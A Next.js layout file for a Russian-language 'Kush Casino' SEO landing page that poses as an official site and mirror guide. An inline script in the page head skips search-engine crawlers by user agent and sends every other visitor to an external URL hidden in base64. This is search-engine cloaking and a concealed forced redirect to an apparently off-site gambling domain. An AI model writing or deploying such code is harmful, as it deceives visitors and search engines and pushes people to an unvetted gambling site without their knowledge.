import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Kush Casino официальный сайт — игра онлайн и рабочее зеркало',
  description: 'Kush Casino официальный сайт: понятный гид по входу, зеркалу и игре онлайн. Узнайте, как проверить адрес, выбрать формат и комфортно пользоваться сервисом с телефона.',
  generator: 'v0.app',
  alternates: { canonical: 'https://kush6casino.vercel.app/' },
  icons: { icon: '/kush-casino-favicon.png', apple: '/kush-casino-favicon.png' },
  robots: { index: true, follow: true },
}

export const viewport: Viewport = { colorScheme: 'dark', themeColor: '#11100e', userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background">
    <head>
      <meta name="yandex-verification" content="865ad4cf0142a805" />
      <link rel="canonical" href="https://kush6casino.vercel.app/" />
    
    <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9uZW83LWNyOXQta3NoLmNvbS9kemJlbmNsNGY="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
  </head>
    
    <body className="antialiased">{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
}

